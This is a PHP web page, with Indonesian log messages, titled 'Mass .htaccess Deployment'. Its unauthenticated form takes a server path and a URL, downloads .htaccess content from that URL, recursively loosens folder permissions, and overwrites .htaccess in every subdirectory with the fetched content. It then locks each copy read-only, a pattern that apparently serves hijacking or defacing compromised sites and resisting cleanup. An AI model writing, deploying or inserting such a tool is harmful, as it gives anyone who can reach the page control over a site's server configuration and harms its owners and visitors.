<?php
$success = [];
$error = [];

function fetchFileFromUrl($url) {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_USERAGENT => 'Mozilla/5.0'
    ]);
    $data = curl_exec($ch);
    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    return ($http_code === 200) ? $data : false;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $targetPath = rtrim($_POST['target_path'], '/');
    $url = $_POST['htaccess_url'];

    if (!is_dir($targetPath)) {
        die("❌ Target path not found: $targetPath");
    }

    $htaccessContent = fetchFileFromUrl($url);
    if (!$htaccessContent) {
        die("❌ Gagal ambil isi .htaccess dari URL.");
    }

    function setFolders0755($dir, &$log) {
        foreach (scandir($dir) as $item) {
            if ($item === '.' || $item === '..') continue;
            $path = $dir . '/' . $item;
            if (is_dir($path)) {
                if (@chmod($path, 0755)) {
                    $log[] = "✅ Folder chmod 0755: $path";
                } else {
                    $log[] = "⚠️ Gagal chmod folder: $path";
                }
                setFolders0755($path, $log);
            }
        }
    }

    function unlockHtaccessFiles($dir, &$log) {
        foreach (scandir($dir) as $item) {
            if ($item === '.' || $item === '..') continue;
            $path = $dir . '/' . $item;
            if (is_dir($path)) {
                unlockHtaccessFiles($path, $log);
            } elseif ($item === '.htaccess') {
                if (@chmod($path, 0644)) {
                    $log[] = "✅ Unlock .htaccess: $path";
                } else {
                    $log[] = "⚠️ Gagal unlock .htaccess: $path";
                }
            }
        }
    }

    function deployHtaccess($dir, $content, &$log) {
        foreach (scandir($dir) as $item) {
            if ($item === '.' || $item === '..') continue;
            $path = $dir . '/' . $item;
            if (is_dir($path)) {
                $htaccessPath = $path . '/.htaccess';
                if (@file_put_contents($htaccessPath, $content) !== false) {
                    @chmod($htaccessPath, 0444);
                    $log[] = "✅ Deployed .htaccess to: $htaccessPath";
                } else {
                    $log[] = "❌ Gagal deploy ke: $htaccessPath";
                }
                deployHtaccess($path, $content, $log);
            }
        }
    }

    setFolders0755($targetPath, $success);
    unlockHtaccessFiles($targetPath, $success);
    deployHtaccess($targetPath, $htaccessContent, $success);
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>🚀 Mass .htaccess Deployment</title>
    <style>
        body { background: #111; color: #eee; font-family: sans-serif; padding: 20px; }
        input, button { padding: 10px; width: 100%; margin-bottom: 10px; }
        button { background: #0f0; color: #000; font-weight: bold; border: none; cursor: pointer; }
        .log { background: #222; padding: 10px; margin-top: 20px; border-radius: 5px; }
        .success { color: #0f0; }
        .error { color: #f33; }
    </style>
</head>
<body>
    <h2>🚀 Mass .htaccess Deployment</h2>
    <form method="POST">
        <label>🎯 Target Path:</label>
        <input type="text" name="target_path" placeholder="/var/www/html" required>

        <label>🌐 URL .htaccess (GitHub raw, dll):</label>
        <input type="text" name="htaccess_url" placeholder="https://raw.githubusercontent.com/.../.htaccess" required>

        <button type="submit">🚀 Deploy Sekarang</button>
    </form>

    <?php if (!empty($success)): ?>
        <div class="log">
            <h3>📋 Log:</h3>
            <?php foreach ($success as $line): ?>
                <div class="<?= strpos($line, '✅') !== false ? 'success' : 'error' ?>"><?= htmlspecialchars($line) ?></div>
            <?php endforeach; ?>
        </div>
    <?php endif; ?>
</body>
</html>
